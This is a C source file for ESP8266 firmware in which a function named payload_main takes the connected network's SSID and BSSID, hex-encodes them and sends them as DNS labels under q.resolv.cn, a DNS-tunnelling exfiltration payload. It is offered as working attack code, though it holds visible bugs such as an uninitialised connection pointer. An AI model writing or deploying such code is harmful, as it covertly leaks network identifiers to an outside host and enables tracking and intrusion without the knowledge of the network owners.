#include "user_interface.h"
#include "osapi.h"
#include "wifi.h"
#include "string.h"
#include "scan.h"

void ICACHE_FLASH_ATTR user_esp_platform_dns_found(const	char	*name,	ip_addr_t	*ip,	void *arg)	{
  if(ip == NULL) {
    os_printf("nslookup failed\n");
    scan_init();
  } else {
    os_printf("query answer: %s\tDST: %d.%d.%d.%d\n",
    name,
    *((uint8 *)&ip->addr), *((uint8 *)&ip->addr + 1),
    *((uint8 *)&ip->addr + 2), *((uint8 *)&ip->addr + 3));

    scan_init();
  }}

void ICACHE_FLASH_ATTR payload_main() {
  char dnsquery[255], query[255], querychars[255], ssid[255], bssid[255], hexssid[255], hexbssid[255];
  char *ptrhexssid, *ptrhexbssid, *ptrquery;
  char *seperator = "21";
  struct espconn *pespconn;
  static ip_addr_t ip;

  ptrhexssid = hexssid;
  ptrhexbssid = hexbssid;

  /* clear values */
  os_memset(ssid, NULL, sizeof(ssid));
  os_memset(bssid, NULL, sizeof(bssid));
  os_memset(hexssid, NULL, sizeof(hexssid));
  os_memset(hexbssid, NULL, sizeof(hexbssid));

  /* values to string */
  os_sprintf(ssid, "%s", stationConf.ssid);
  os_sprintf(bssid, "%02X%02X%02X%02X%02X%02X",
  stationConf.bssid[0], stationConf.bssid[1], stationConf.bssid[2],
  stationConf.bssid[3], stationConf.bssid[4], stationConf.bssid[5]);

  /* convert values to hexencoded ascii */
  string_strtohex(ssid, &ptrhexssid);
  string_strtohex(bssid, &ptrhexbssid);

  os_memset(querychars, NULL, sizeof(querychars));
  os_sprintf(querychars, "%s%s%s", ptrhexssid, seperator, ptrhexbssid);


  os_memset(query, NULL, sizeof(query));


  /* this needs fixing so it does not add a . after the last char */
  int i, labellength, querypos;
  labellength = 0;
  querypos = 0;

  for(i = 0; querychars[i] != '\0'; i++) {
    if(labellength == 63) {
      query[querypos] = '.';
      querypos++;
      labellength = 0;
    }
    query[querypos] = querychars[i];
    labellength++;
    querypos++;
  }

  os_memset(dnsquery, NULL, sizeof(dnsquery));
  os_sprintf(dnsquery, "%s.q.resolv.cn", query);

  os_printf("query: %s\n", dnsquery);

  espconn_gethostbyname(pespconn, dnsquery, &ip, user_esp_platform_dns_found);
}
